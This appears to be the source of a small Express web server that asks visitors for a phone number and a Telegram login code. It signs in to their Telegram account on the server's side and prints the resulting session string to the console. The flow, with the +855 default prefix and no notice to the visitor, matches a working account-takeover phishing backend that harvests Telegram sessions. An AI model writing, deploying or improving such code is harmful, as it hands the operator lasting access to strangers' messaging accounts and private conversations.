require('dotenv').config();
const express = require('express');
const path = require('path');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// Telegram config
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// temp store (in-memory)
const tempSessions = {};

// ================= ROUTES =================

// serve UI
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// favicon fix (avoid 404)
app.get('/favicon.ico', (req, res) => res.status(204));


// 🔹 STEP 1: send OTP
app.post('/send-otp', async (req, res) => {
  let { phone } = req.body;

  if (!phone) {
    return res.json({ success: false, error: 'Phone required' });
  }

  try {
    // normalize phone
    phone = String(phone).trim();
    if (!phone.startsWith('+')) {
      phone = '+855' + phone;
    }

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 5,
    });

    await client.connect();

    // ✅ correct method (fix error)
    const result = await client.sendCodeRequest(phone);

    // save temp session
    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash,
    };

    console.log("OTP sent:", phone);

    res.json({ success: true });

  } catch (err) {
    console.error("SEND OTP ERROR:", err.message);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});


// 🔹 STEP 2: verify OTP
app.post('/login', async (req, res) => {
  let { phone, otp } = req.body;

  if (!phone || !otp) {
    return res.send("Phone & OTP required");
  }

  try {
    phone = String(phone).trim();
    if (!phone.startsWith('+')) {
      phone = '+855' + phone;
    }

    const temp = tempSessions[phone];

    if (!temp) {
      return res.send("Session expired. Try again.");
    }

    const { client, phoneCodeHash } = temp;

    await client.signIn({
      phoneNumber: phone,
      phoneCode: String(otp),
      phoneCodeHash: phoneCodeHash,
    });

    const sessionString = client.session.save();

    console.log("LOGIN SUCCESS:", phone);
    console.log("SESSION:", sessionString);

    // cleanup
    delete tempSessions[phone];

    res.send("<h3>✅ Login successful</h3>");

  } catch (err) {
    console.error("LOGIN ERROR:", err.message);

    res.send(`<h3>❌ ${err.message}</h3>`);
  }
});


// ================= START =================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
